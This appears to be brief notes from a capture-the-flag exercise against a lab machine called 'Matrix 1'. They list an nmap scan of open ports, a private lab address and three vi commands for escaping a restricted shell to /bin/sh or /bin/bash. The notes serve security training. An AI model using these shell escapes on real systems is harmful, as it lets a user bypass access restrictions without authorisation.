# Matrix 1

## openn port

use nmap to detect open ports:

80, 22, 31337

## access

try to access http://192.168.3.144:31337

## use vi to escape

### method 1

```
vi -c ':!/bin/sh' /dev/null
```

### method 2

```
vi
:set shell=/bin/sh
:shell
```

### method 3

```
vi 
:! /bin/bash
```
